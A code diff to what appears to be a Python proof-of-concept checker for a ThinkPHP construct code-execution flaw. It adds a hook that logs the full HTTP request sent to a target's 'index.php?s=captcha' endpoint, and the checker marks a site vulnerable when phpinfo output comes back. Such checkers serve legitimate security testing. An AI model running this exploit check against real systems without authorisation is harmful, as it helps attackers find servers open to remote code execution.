@@ -14,7 +14,20 @@ urllib3.disable_warnings()
 
 
 vul_info = []
+all_req_payload = ""
 
+def ResponseHook(rep, **kwargs):
+    global all_req_payload
+    rep.encoding = 'utf-8'
+    request_str = '%s %s HTTP/%.1f\n' % (rep.request.method, rep.request.path_url, rep.raw.version * 0.1)
+    request_str += f"Host: {urlparse(rep.url).netloc}\n"
+    for k, v in dict(rep.request.headers).items():
+        request_str += f"{k}: {v}\n"
+ 
+    if rep.request.body:
+        request_str += '\n' + str(rep.request.body)
+    all_req_payload = request_str
+    
 def thinkphp_construct_code_exec_verify(url):
     global vul_info
     pocdict = {
@@ -38,7 +51,7 @@ def thinkphp_construct_code_exec_verify(url):
     try:
         vurl = urllib.parse.urljoin(url, 'index.php?s=captcha')
         print(vurl)
-        req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False)
+        req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False,hooks={'response': ResponseHook})
         #print(req.text)
         if 'phpinfo()' in req.text and 'PHP Version' in req.text and 'www.php.net' in req.text:
             pocdict['isvul'] = True
